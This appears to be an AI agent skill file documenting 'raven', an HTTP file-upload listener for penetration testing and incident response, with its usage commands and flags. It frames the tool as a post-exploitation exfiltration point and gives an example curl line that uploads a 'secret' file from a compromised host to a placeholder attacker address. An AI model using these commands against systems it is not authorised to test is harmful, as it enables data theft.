---
name: raven
description: A lightweight HTTP file upload service designed for penetration testing and incident response. Use when you need to receive files from remote clients (exfiltration or data transfer) in scenarios where protocols like SMB are unavailable or restricted. It extends the functionality of the standard Python http.server by providing a self-contained upload capability.
---

# raven

## Overview
Raven is a Python-based tool that provides a simple web server capable of receiving file uploads. While `python3 -m http.server` is commonly used for serving files, Raven fills the gap when an attacker or responder needs to ingest files from a remote target. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume Raven is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install raven
```

## Common Workflows

### Basic listener on all interfaces
Starts a listener on port 8080 (default) to receive files in the current directory.
```bash
raven 0.0.0.0 8080
```

### Restricted exfiltration point
Listen on port 443, restricted to a specific target IP, and save files to a dedicated directory.
```bash
raven 192.168.1.10 443 --allowed-ip 192.168.1.50 --upload-dir /tmp/loot
```

### Organized multi-target collection
Collect files from multiple clients and automatically sort them into subfolders based on the sender's IP address.
```bash
raven 0.0.0.0 8080 --organize-uploads --upload-dir ./incoming
```

## Complete Command Reference

```bash
usage: raven [lhost] [lport] [--allowed-ip <allowed_client_ip>] [--upload-dir <upload_directory>] [--organize-uploads]
```

### Positional Arguments

| Argument | Description |
|----------|-------------|
| `lhost` | The IP address for the HTTP handler to listen on (default: listen on all interfaces) |
| `lport` | The port for the HTTP handler to listen on (default: 8080) |

### Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show the help message and exit |
| `--allowed-ip <ALLOWED_IP>` | Restrict access to the HTTP handler by a specific IP address (optional) |
| `--upload-dir <UPLOAD_DIR>` | Designate the directory to save uploaded files to (default: current working directory) |
| `--organize-uploads` | Organize file uploads into subfolders named by the remote client IP |

## Notes
- Raven is particularly useful when you have command execution on a target and need to "upload" a file to your local machine using tools like `curl` or `powershell`.
- Example client-side upload using `curl`: `curl -F "file=@/path/to/secret.txt" http://<your-ip>:8080/`
- Ensure the `--upload-dir` exists and is writable by the user running Raven.